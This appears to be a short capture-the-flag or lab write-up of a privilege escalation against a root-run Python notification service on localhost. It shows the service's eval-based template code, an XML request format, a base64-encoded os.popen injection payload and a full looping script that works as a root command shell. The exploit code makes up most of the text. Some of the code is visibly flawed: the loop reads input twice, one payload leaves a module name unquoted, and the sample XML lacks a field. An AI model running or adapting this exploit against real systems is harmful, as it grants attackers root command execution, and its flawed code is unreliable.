I notice that root is running a Python file I have read permissions on, and that this file listens on port 54321 on localhost.

After dumping the Python file I understand it is a notification bot, and I notice the presence of an Expression Language Injection vulnerability. The vulnerable code section is reported below:

def template(first, last, sender, ts, dob, gender):
      pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
      for s in [first, last, sender, ts, dob, gender]:
            if not pattern.fullmatch(s):
                  return "[INVALID_INPUT]"
      # DOB format is DD/MM/YYYY
      try:
            year_of_birth = int(dob.split('/')[-1])
            if year_of_birth < 1900 or year_of_birth > datetime.now().year:
                  return "[INVALID_DOB]"
      except:
            return "[INVALID_DOB]"
      template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
      try:
            return eval(f"f'''{template}'''")
      except Exception as e:
            return f"[EVAL_ERROR] {e}"
As we can see, the vulnerability is intentional and is handled only through a regular expression that effectively filters only the space and - characters.

The API accepts a POST request with an XML object of the following format:

<patient>
   <firstname>kodiak</firstname>
   <lastname>kodiak</lastname>
   <sender_app>{ PAYLOAD BETWEEN THE BRACES }</sender_app>
   <timestamp>01/01/1900</timestamp>
   <gender>M</gender>
</patient>

Since the os module is already imported in the script, we can import the base64 module to avoid having to pass spaces:

os.popen(__import__(base64).b64decode('[CMD in base 64]').decode()).read()

This file, once saved on the target machine, allows running a mini shell as root:

import requests, base64

while True:
   cmd = input("$: ")
   if cmd == "exit":
      exit(0)

   payload = base64.b64encode(input("$: ").encode('ascii')).decode()
   data = """
   <patient>
      <firstname>kodiak</firstname>
      <lastname>kodiak</lastname>
      <sender_app>{os.popen(__import__('base64').b64decode('""" + payload + """').decode()).read()}</sender_app>
      <timestamp>12345</timestamp>
      <birth_date>01/01/1900</birth_date>
      <gender>M</gender>
   </patient>"""

   r = requests.post(url="http://127.0.0.1:54321/addPatient", data=data, headers={'Content-Type': 'application/xml'})

   print(r.text.split("from")[1].split("at")[0].strip())
